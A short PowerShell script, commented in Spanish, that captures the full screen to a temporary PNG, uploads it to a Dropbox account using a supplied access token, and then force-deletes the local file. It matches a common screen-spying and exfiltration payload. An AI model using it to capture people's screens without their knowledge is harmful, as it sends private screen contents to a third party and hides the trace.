# Función para capturar la pantalla y guardarla como un archivo PNG
function Capture-Screen {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
    $filePath = "$env:TEMP\screenshot.png"
    $bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    return $filePath
}

# Función para subir archivos a Dropbox usando un token de acceso
function DropBox-Upload {
    param (
        [string]$SourceFilePath,
        [string]$DbToken
    )
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath = "/$outputFile"
    $arg = @{
        "path" = $TargetFilePath
        "mode" = "add"
        "autorename" = $true
        "mute" = $false
    } | ConvertTo-Json

    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", "Bearer $DbToken")
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')

    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

# Función principal que orquesta la captura y subida
function Perform-CaptureAndUpload {
    param([string]$DbToken)
    try {
        # Capturar la pantalla y obtener la ruta del archivo PNG
        $screenshotPath = Capture-Screen

        # Subir la captura de pantalla a Dropbox
        if (-not ([string]::IsNullOrEmpty($DbToken))) {
            DropBox-Upload -SourceFilePath $screenshotPath -DbToken $DbToken
        } else {
            Write-Error "No se proporcionó el token de acceso de Dropbox."
        }

        # Limpiar el archivo de captura de pantalla del sistema
        Remove-Item -Path $screenshotPath -Force
    } catch {
        Write-Error "Ocurrió un error durante la captura o la subida: $_"
    }
}
